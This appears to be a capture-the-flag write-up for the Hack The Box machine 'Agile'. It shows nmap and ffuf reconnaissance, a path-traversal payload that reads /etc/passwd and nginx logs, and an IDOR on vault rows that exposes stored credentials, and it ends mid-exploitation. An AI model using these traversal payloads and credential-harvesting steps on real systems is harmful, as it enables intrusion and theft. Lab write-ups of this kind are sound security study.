<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 10.10.11.203 -p- -v -T4

```
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 10:51 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
Initiating Ping Scan at 10:51
Scanning 10.10.11.203 [2 ports]
Completed Ping Scan at 10:51, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:51
Completed Parallel DNS resolution of 1 host. at 10:51, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:51
Scanning 10.10.11.203 [2 ports]
Discovered open port 80/tcp on 10.10.11.203
Discovered open port 22/tcp on 10.10.11.203
Completed Connect Scan at 10:51, 0.34s elapsed (2 total ports)
Initiating Service scan at 10:51
Scanning 2 services on 10.10.11.203
Completed Service scan at 10:51, 6.53s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.203.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 7.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 1.13s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
Nmap scan report for 10.10.11.203
Host is up, received conn-refused (0.25s latency).
Scanned at 2023-03-11 10:51:17 WAT for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCeVL2Hl8/LXWurlu46JyqOyvUHtAwTrz1EYdY5dXVi9BfpPwsPTf+zzflV+CGdflQRNFKPDS8RJuiXQa40xs9o=
|   256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEcaZPDjlx21ppN0y2dNT1Jb8aPZwfvugIeN6wdUH1cK
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.90 seconds
```
From our scan we have 2 open ports, port 22 which runs ssh and port 80 which runs http. So, our enumeration will be focused more on port 80.



<h2>Enumeration</h2>

Going to the webpage, you should have this

![image](https://user-images.githubusercontent.com/67879936/224513895-f38efaaa-0569-49b5-9d15-cc1024442f59.png)

Lets go ahead and add ```superpass.htb``` to our ```/etc/hosts``` file

>command: sudo nano /etc/hosts

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
└─$ sudo nano /etc/hosts
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       bl4ck4non

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.203 superpass.htb
```
Now, lets revisit the webpage

![image](https://user-images.githubusercontent.com/67879936/224514089-65181b49-5fb6-47b8-80fe-993c7622a5aa.png)

cool, lets go ahead and create and account, then from there we login to the webserver

![image](https://user-images.githubusercontent.com/67879936/224514186-946c7e18-84c0-4ac7-b1e9-d9de02553ae5.png)

![image](https://user-images.githubusercontent.com/67879936/224514208-cc69fb53-78ba-4766-87f3-5cb2fea33bb5.png)

cool, we are logged in. Lets go ahead and fuzz for directories

>command: ffuf -u "http://superpass.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
└─$ ffuf -u "http://superpass.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://superpass.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 6128, Words: 2174, Lines: 131, Duration: 580ms]
download                [Status: 302, Size: 249, Words: 18, Lines: 6, Duration: 294ms]
static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 282ms]
vault                   [Status: 302, Size: 243, Words: 18, Lines: 6, Duration: 582ms]
:: Progress: [32298/32298] :: Job [1/1] :: 51 req/sec :: Duration: [0:03:54] :: Errors: 0 ::
```
Going to the ```/download``` directory

![image](https://user-images.githubusercontent.com/67879936/224582704-7bc55bc3-6a27-4be0-975c-72ba874fc645.png)

Lets view the source page

![image](https://user-images.githubusercontent.com/67879936/224582737-7db520cc-502e-4b8d-93de-6fab65487828.png)

We found this commented error code, what does this code says??

><font color="Green">The error message "FileNotFoundError: [Errno 2] No such file or directory: '/tmp/None'" suggests that the file that the program is trying to open does not exist.

The file path is '/tmp/None', which implies that the filename variable 'fn' might be None or empty. Therefore, when the program tries to open the file with the open() function, it cannot find the file and raises the FileNotFoundError.

You can check whether the variable 'fn' is None or empty and ensure that the file exists at the specified location before opening it. Alternatively, you can use a try-except block to handle the FileNotFoundError and provide a more informative error message for the user.</font>

Now, lets check for the variable ```fn```,

Link: http://superpass.htb/download?fn=

Running this gave me this

![image](https://user-images.githubusercontent.com/67879936/224583384-6f030ae2-f1a7-4575-b34b-70601d489282.png)

This kind of means we are probably sitting in the ```/tmp``` directory. Lets test this for possible LFI




<h2>Exploitation</h2>

Testing for possible LFI

Link:http://superpass.htb/download?fn=../../../../../../../etc/passwd

This downloads the ```/etc/passwd``` file to your machine in a ```.csv``` format

![image](https://user-images.githubusercontent.com/67879936/224583544-2ca3598a-db86-4d4a-8b29-d9d6739630f2.png)

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
└─$ ls
superpass_export.csv
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
└─$ file superpass_export.csv                                                                                        
superpass_export.csv: ASCII text
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Agile]
└─$ cat superpass_export.csv 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```
cool, we have 3 possible users on this machine ```dev_admin```, ```corum```, ```edwards```. I tried bruteforcing the ssh passwords for each user but I couldnt't find any. After a while, I went on to view the log files ```/var/log/nginx/access.log```

Link:http://superpass.htb/download?fn=../../../../../../../../var/log/nginx/access.log

This downloads the log files to our machine, lets go ahead and view the logs. Going through the logs I found a new directory ```/add_row``` now this didn't appear when we did our directory enumeration,

![image](https://user-images.githubusercontent.com/67879936/224584521-9bdc1902-4bfa-4ec2-a9ac-a7723c801b52.png)

Going to the ```/add_row``` directory

![image](https://user-images.githubusercontent.com/67879936/224585064-9ef6fbb3-0db8-436d-8ccd-f1dc884c59ae.png)

After a while, I thought to myself if there was an ```/add_row``` directory, then there definitely would  be a ```/row``` directory. 

Link:http://superpass.htb/vault/row/

![image](https://user-images.githubusercontent.com/67879936/224585475-61fd38d9-e0c7-4bb6-8ad2-ff8415777176.png)

We got a "Not Found" error, I went ahead to FUZZ the ```/row``` directory using burpsuite

![image](https://user-images.githubusercontent.com/67879936/224587604-8710da3b-1087-40d8-a285-6d1e67f65ba6.png)
![image](https://user-images.githubusercontent.com/67879936/224587661-7d16c751-8809-4d2a-b8cd-1ac715462481.png)

I got this list of directories which might be available. So, starting with ```3```

Link:http://superpass.htb/vault/row/3

![image](https://user-images.githubusercontent.com/67879936/224587743-e53107ad-1a28-4809-a272-4d78f9476d62.png)

Now, this presented us with a ```website```, ```username```, and a ```password```. 

Trying other directories burp intruder gave us, I tried 4 next

Link:http://superpass.htb/vault/row/4

![image](https://user-images.githubusercontent.com/67879936/224587939-7d25737c-bfb3-4cc0-828d-35dd29705933.png)

We found another credentials. At this point I knew we were dealing with a vulnerability called ``IDOR```

> <font color="Green">IDOR, or Insecure Direct Object Reference, is a type of security vulnerability that arises when an application allows a user to access or manipulate resources by directly referencing them using an identifier, such as a file name, record ID, or user account number.

If the application fails to properly authenticate and authorize user access to those resources, an attacker may be able to bypass those checks by manipulating the identifier, and gain unauthorized access to data or functionality that should be restricted.</font>

To exploit this we'll be using burp intruder to fuzz 

![image](https://user-images.githubusercontent.com/67879936/224588282-08667bc4-3634-4280-ac9e-e6edcf8290f1.png)































